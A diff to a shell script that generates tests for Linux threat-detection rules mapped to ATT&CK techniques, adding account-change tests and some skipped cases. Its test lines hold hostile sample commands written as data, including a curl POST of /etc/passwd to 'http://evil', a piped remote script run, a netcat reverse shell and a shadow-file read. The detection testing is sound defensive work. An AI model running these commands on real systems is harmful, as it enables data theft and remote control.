@@ -52,13 +52,15 @@ N() { local id="$1" title="$2" needle="$3" name="$4"; shift 4
 S() { SKIPPED+=("$1"); }
 
 # ---- generated tests ----
+N 'L-ACCT-001' '[T1136.001] Local Account or Group Modified via CLI' '"[T1136.001] Local Account or Group Modified via CLI"' 'useradd' 'bob'
+N 'L-ACCT-002' '[T1098] User Added to Privileged Group' '"[T1098] User Added to Privileged Group"' 'usermod' '-aG' 'sudo' 'bob'
 N 'L-DLP-010' '[T1005] Database Dump Command' '"[T1005] Database Dump Command"' 'mysqldump' 'db'
 T 'L-T1003.008' '[T1003.008] /etc/shadow Read' '"[T1003.008] /etc/shadow Read"' 'cat' '/etc/shadow'
 N 'L-T1021.004' '[T1021.004] SSH Tunnel / Port Forward' '"[T1021.004] SSH Tunnel / Port Forward"' 'ssh' '-R' '8080:localhost:80' 'jump'
 T 'L-T1046' '[T1046] Network Scanning Tool' '"[T1046] Network Scanning Tool"' 'nmap' '-sS' '10.0.0.0/24'
 N 'L-T1048' '[T1048] curl POST Data Exfiltration' '"[T1048] curl POST Data Exfiltration"' 'curl' '-X' 'POST' '-d' '@/etc/passwd' 'http://evil'
 N 'L-T1059.004a' '[T1059.004] Shell Suspicious Execution' '"[T1059.004] Shell Suspicious Execution"' 'bash' '-c' 'curl' 'http://x/a.sh' '|' 'sh'
-T 'L-T1059.004b' '[T1059.004] Executable Run from /tmp or /dev/shm' '"[T1059.004] Executable Run from /tmp or /dev/shm"' '/tmp/payload'
+N 'L-T1059.004b' '[T1059.004] Executable Run from /tmp or /dev/shm' '"[T1059.004] Executable Run from /tmp or /dev/shm"' 'payload'
 N 'L-T1059.004c' '[T1059.004] Netcat Reverse Shell' '"[T1059.004] Netcat Reverse Shell"' 'nc' '-e' '/bin/sh' '10.0.0.5' '4444'
 N 'L-T1059.006' '[T1059.006] Python/Perl/Ruby Reverse Shell' '"[T1059.006] Python/Perl/Ruby Reverse Shell"' 'python3' '-c' 'import' 'socket,subprocess;socket.socket()'
 T 'L-T1070.002' '[T1070.002] Log File Deletion or History Wipe' '"[T1070.002] Log File Deletion or History Wipe"' 'history' '-c'
@@ -79,11 +81,14 @@ T 'L-T1574.006' '[T1574.006] LD_PRELOAD Hijacking' '"[T1574.006] LD_PRELOAD Hija
 N 'L-T1590' '[T1590] DNS/Domain Reconnaissance' '"[T1590] DNS/Domain Reconnaissance"' 'dig' 'example.com'
 T 'L-T1592' '[T1592] Packet Capture Tool' '"[T1592] Packet Capture Tool"' 'tcpdump' '-i' 'eth0'
 T 'L-T1611' '[T1611] Container Escape Indicator' '"[T1611] Container Escape Indicator"' 'nsenter' '--target' '1' '--mount'
+S 'L-CTR-001: needs a real container event (log, file or system change)'
+S 'L-SW-001: needs a real software event (log, file or system change)'
 S 'L-T1053.003: needs a real file event (log, file or system change)'
 S 'L-T1110.001: needs a real logon event (log, file or system change)'
 S 'L-T1543.002: needs a real file event (log, file or system change)'
 S 'L-T1546.004: needs a real file event (log, file or system change)'
 S 'L-T1572: needs a real dns event (log, file or system change)'
+S 'L-USB-001: needs a real usb event (log, file or system change)'
 # ---- end of generated tests ----
 
 if [ "$LIST" = 1 ]; then
